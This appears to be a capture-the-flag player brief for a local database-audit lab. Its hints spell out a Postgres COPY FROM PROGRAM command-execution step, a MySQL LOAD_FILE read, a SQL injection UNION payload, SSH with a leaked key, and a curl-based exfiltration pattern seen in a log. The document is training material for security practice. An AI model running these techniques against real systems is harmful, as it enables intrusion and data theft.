# The Audit — player brief

You're the pentester on a database-infrastructure audit. Five findings, five
flags `AUD{...}`. Four are live services; the last is a log review.

## Access

- **Postgres:** `localhost:55432` · **MySQL:** `localhost:33306` · **SSH:** `localhost:2222`
- **Web app:** http://localhost:8096 · **Scoreboard:** http://localhost:8505
- Submit flags on the scoreboard.

## The findings

1. **The Query Plan** — the Postgres box is internet-exposed with a weak
   superuser password. Superusers can run OS commands.
2. **The Dump** — an app MySQL user has more privilege than it needs, and the
   server lets it touch the filesystem.
3. **The Catalog** — the storefront's product lookup trusts its input.
4. **The Backdoor Key** — the app's "ops backup" directory is world-readable.
5. **The Audit Trail** — read the SSH and DB audit logs on the scoreboard; what
   did the intruder take?

## Hints

<details><summary>1 — Postgres</summary>
User <code>postgres</code> / password <code>postgres</code>. Then
<code>CREATE TABLE x(d text); COPY x FROM PROGRAM 'cat /flag'; SELECT * FROM x;</code>
</details>

<details><summary>2 — MySQL</summary>
User <code>appuser</code> / <code>appuser</code> has <code>FILE</code>, and
<code>secure_file_priv</code> is empty: <code>SELECT LOAD_FILE('/flag')</code>.
</details>

<details><summary>3 — SQLite</summary>
<code>/api/product?id=1</code> is injectable. Dump <code>sqlite_master</code> to
find the table, then
<code>id=0 UNION SELECT id,k,v FROM ops_secret_vault--</code>.
</details>

<details><summary>4 — SSH</summary>
The app serves its backup at <code>/backup/</code>. Fetch
<code>/backup/id_ed25519</code> and
<code>ssh -i id_ed25519 dbadmin@localhost -p 2222 cat /flag</code>.
</details>

<details><summary>5 — Forensics</summary>
In <code>/audit/auth.log</code>, find the one <em>Accepted publickey</em> for
<code>dbadmin</code> and its time. In <code>/audit/pg_audit.log</code>, the
attacker's session starts seconds later and exfiltrates via
<code>COPY ... TO PROGRAM 'curl ...?c=&lt;base64&gt;'</code>. Concatenate that
session's <code>c=</code> chunks and base64-decode. (A 03:00 "nightly backup"
session is a decoy.)
</details>
